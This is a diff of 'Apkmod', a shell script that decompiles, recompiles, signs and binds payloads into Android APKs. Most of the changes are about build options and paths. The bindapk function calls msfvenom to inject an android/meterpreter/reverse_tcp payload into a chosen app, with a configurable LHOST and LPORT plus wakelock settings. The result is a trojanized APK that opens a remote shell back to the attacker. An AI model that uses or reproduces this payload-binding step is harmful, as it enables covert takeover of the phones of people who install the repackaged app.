@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/usr/bin/sh
+#!/usr/bin/env sh
 
 ########################################
 # Project : Apkmod     		       #
@@ -7,7 +7,8 @@
 ########################################
 
 CWD=$(pwd)
-VERSION="1.9"
+VERSION="2.0"
+AAPT=""
 
 #colors
 cyan='\033[1;36m'                       
@@ -28,7 +29,6 @@ usage() {
     -s              For signing
     -b              For binding payload
     -o              Specify output file or directory
-    -a              Use aapt2
     -V              verbose output
     -z              for zipalign
     --no-res        prevents decompiling of resources
@@ -51,7 +51,6 @@ enable_perm() {
     for i in minSdkVersion targetSdkVersion; do
         sed -i "s/$i.*/$i: '22'/" $tmp_dir/apktool.yml
     done
-    USE_AAPT2=yes
     recompile ${tmp_dir} ${2}
     signapk ${2} temp.apk
     mv temp.apk ${2}
@@ -87,8 +86,8 @@ decompile() {
     if [ "${VERBOSE}" = "yes" ]; then
         vbs_arg="-v"
     fi
-	apktool ${NO_ASSETS} ${NO_RES} ${NO_SMALI} ${vbs_arg} d -f ${1} -o ${2} -p ${FRAMEPATH:-/home/.framework}
-    rm -f $PREFIX/share/TermuxAlpine/home/.framework/1.apk
+	apktool ${NO_ASSETS} ${NO_RES} ${NO_SMALI} ${vbs_arg} d -f ${1} -o ${2} -p ${FRAMEPATH:-$HOME/.apkmod/framework}
+    rm -f $HOME/.apkmod/framework/1.apk
     if [ ! -e ${2} ]; then
         error_msg "Can't decompile, take screenshot and open a issue on github"
         exit 1
@@ -97,18 +96,12 @@ decompile() {
 }
 
 recompile() {
-    local AAPT=""
     local vbs_arg=""
 	print_status "Recompiling ${1}"
-    if [ "${USE_AAPT2}" = "yes" ]; then
-        AAPT="/usr/bin/aapt2"
-    else
-        AAPT="/usr/bin/aapt"
-    fi
     if [ "${VERBOSE}" = "yes" ]; then
         vbs_arg="-v"
     fi
-    apktool ${vbs_arg} b -a ${AAPT} -o ${2} ${1}
+    apktool ${vbs_arg} b $AAPT -o ${2} ${1}
     if [ ! -e ${2} ]; then
         error_msg "Try again with -a option\nBut if still can't recompile, take screenshot and open a issue on github"
         exit 1
@@ -135,12 +128,9 @@ signapk() {
 
 bindapk() {
 	print_status "Binding ${3}"
-    if [ "${USE_AAPT2}" = "yes" ]; then
-        aapt_arg="--use-aapt2"
-    fi
-    msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o ${4}
+    msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
 	if [ ! -e ${4} ]; then
-		error_msg "Try again with -a option\nBut if still can't bind, take screenshot and open a issue on github"
+		error_msg "can't bind, take screenshot and open a issue on github"
 		exit 1
 	fi
 	print_status "Binded to ${4}"
@@ -220,7 +210,7 @@ if [ $# -eq 0 ]; then
     exit 1
 fi
 
-while getopts ":z:d:r:s:b:o:ahvuVR:-:" opt; do
+while getopts ":z:d:r:s:b:o:hvuVR:-:" opt; do
     case $opt in
         d)
             ACTION="decompile"
@@ -246,9 +236,6 @@ while getopts ":z:d:r:s:b:o:ahvuVR:-:" opt; do
             ;;
         o)
             out_abs_path=$(readlink -m ${OPTARG})
-            ;;
-        a)
-            USE_AAPT2="yes"
             ;;
         h)
             usage
